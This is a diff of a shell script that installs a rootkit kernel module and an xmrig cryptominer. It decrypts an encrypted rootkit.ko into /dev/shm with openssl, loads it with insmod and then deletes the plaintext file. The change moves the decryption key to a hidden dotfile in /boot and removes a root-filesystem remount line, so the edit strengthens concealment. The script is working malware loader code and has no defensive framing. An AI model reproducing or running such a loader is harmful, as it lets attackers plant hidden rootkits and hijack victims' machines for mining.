@@ -6,8 +6,6 @@
 #rootkit .ko /lib/modules/$(uname -r)/extra/rootkit.ko
 #xmrig binary and config file /opt/xmrig/FILES
 
-mount -o remount,rw /
-
 module_compile_dir="/boot/rootkit/src"
 module_dir="/lib/modules/$(uname -r)/extra"
 
@@ -65,8 +63,8 @@ if [ ! -d "$module_dir" ]; then
 fi
 
 #cp "$module_compile_dir/rootkit.ko" "$module_dir/rootkit.ko"
-if [ -f "$module_dir/rootkit.ko.enc" ] || [ -f "/boot/keyfile.bin" ]; then
-	openssl enc -d -aes-256-cbc -pbkdf2 -in "$module_dir/rootkit.ko.enc" -out "/dev/shm/rootkit.ko" -pass file:"/boot/keyfile.bin"
+if [ -f "$module_dir/rootkit.ko.enc" ] || [ -f "/boot/.keyfile.bin" ]; then
+	openssl enc -d -aes-256-cbc -pbkdf2 -in "$module_dir/rootkit.ko.enc" -out "/dev/shm/rootkit.ko" -pass file:"/boot/.keyfile.bin"
 fi
 insmod "/dev/shm/rootkit.ko"
 rm -rf "/dev/shm/rootkit.ko"
